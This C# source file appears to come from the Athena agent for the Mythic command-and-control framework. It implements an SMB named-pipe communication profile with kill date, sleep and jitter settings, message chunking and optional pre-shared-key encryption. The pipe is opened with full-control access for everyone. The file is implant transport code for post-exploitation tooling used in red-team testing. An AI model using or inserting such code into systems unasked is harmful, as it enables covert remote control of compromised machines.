using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System.Collections.Concurrent;
using H.Pipes;
using H.Pipes.Args;
using Athena.Models.Config;
using System.Diagnostics;
using System.IO.Pipes;
using System.Security.Principal;
using System.Security.AccessControl;
using H.Pipes.AccessControl;
using System.Text;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        //public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }

        public Config()
        {
            //uuid = "%UUID%";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
            this.sleep = sleep;
            int jitter = 0;
            this.jitter = jitter;
            this.profile = new Smb();
        }
    }

    public class Smb : IProfile
    {
        public string uuid { get; set; }
        public string psk { get; set; }
        private PipeServer<DelegateMessage> serverPipe { get; set; }
        public string pipeName = "pipename";
        private bool connected { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("false");
        public PSKCrypto crypt { get; set; }
        public BlockingCollection<DelegateMessage> queueIn { get; set; }
        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();

        public Smb()
        {
            uuid = "%UUID%";
            this.connected = false;
            this.psk = "";
            this.queueIn = new BlockingCollection<DelegateMessage>();
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }
            this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }

            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
            this.serverPipe.StartAsync();

            Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
        }
        public async Task<bool> IsConnected()
        {
            return this.connected;
        }

        private async void OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
        {
            try
            {
                Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.message.Length} bytes");
                //Add message to out queue.
                if (this.partialMessages.ContainsKey(args.Message.uuid))
                {
                    if (args.Message.final)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Final message received.");
                        string oldMsg = args.Message.message;

                        //Append the final message to our object
                        args.Message.message = this.partialMessages[args.Message.uuid].Append(oldMsg).ToString();
                        this.queueIn.Add(args.Message);

                        this.partialMessages.Remove(args.Message.uuid, out _);
                        Debug.WriteLine($"[{DateTime.Now}] Setting Event Happened Signal.");
                        onEventHappenedSignal.Set(); //Indicate something happened
                    }
                    else //Not Last Message but we already have a value in the partial messages
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Appending message to existing tracker.");
                        this.partialMessages[args.Message.uuid].Append(args.Message.message);
                    }
                }
                else //First time we've seen this message
                {
                    if (args.Message.final)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Message doesn't need to be chunked, setting Event Happened Signal.");
                        this.queueIn.Add(args.Message);
                        onEventHappenedSignal.Set(); //Indicate something happened
                    }
                    else
                    {
                        Debug.WriteLine($"[{DateTime.Now}] New message received, adding to tracker.");
                        this.partialMessages.GetOrAdd(args.Message.uuid, new StringBuilder(args.Message.message)); //Add value to our Collection
                    }
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] {e}");
            }
        }

        public async Task OnClientConnection()
        {
            Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
            onClientConnectedSignal.Set();
            this.connected = true;
        }

        public async Task OnClientDisconnect()
        {
            Debug.WriteLine($"[{DateTime.Now}] Client Disconnected.");
            this.connected = false;
            onEventHappenedSignal.Set(); //Indicate something happened
            onClientConnectedSignal.Reset();
            this.partialMessages.Clear();
        }

        //Send, wait for a response, and return it to the main functions
        public async Task<string> Send(string json)
        {
            if (!connected)
            {
                onClientConnectedSignal.WaitOne();
            }

            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                DelegateMessage dm = new DelegateMessage()
                {
                    uuid = this.uuid,
                    c2_profile = "smb",
                    final = false
                };

                IEnumerable<string> parts = json.SplitByLength(4000);

                //hunk the message and send the parts
                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {json.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes.");
                    dm.message = part;

                    if (part == parts.Last())
                    {
                        dm.final = true;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {dm.final}");
                    await this.serverPipe.WriteAsync(dm);
                }

                //Wait for a signal
                Debug.WriteLine($"[{DateTime.Now}] Waiting for full response from Mythic.");
                onEventHappenedSignal.WaitOne();
                if (!connected) //Our event was a client disconnect
                {
                    Debug.WriteLine($"[{DateTime.Now}] Lost connection to client. Restarting loop.");
                    onEventHappenedSignal.Reset(); //Reset the event and return empty
                    return String.Empty;
                }
                else //Our event was a new message
                {
                    Debug.WriteLine($"[{DateTime.Now}] Received new message!");
                    if (this.queueIn.Count > 0) //Check if we actually got a message
                    {
                        dm = this.queueIn.Take(); //Take a value from it

                        onEventHappenedSignal.Reset(); //Reset the event and return


                        if (this.encrypted)
                        {
                            return this.crypt.Decrypt(dm.message);
                        }

                        if (!string.IsNullOrEmpty(json))
                        {
                            return (await Misc.Base64Decode(dm.message)).Substring(36);
                        }

                    }
                }

            }
            catch (Exception e)
            {
                this.connected = false;
            }

            return String.Empty;
        }
    }
    class SmbMessage
    {
        public string uuid;
        public string message;
        public int chunks;
        public int chunk;
    }
}
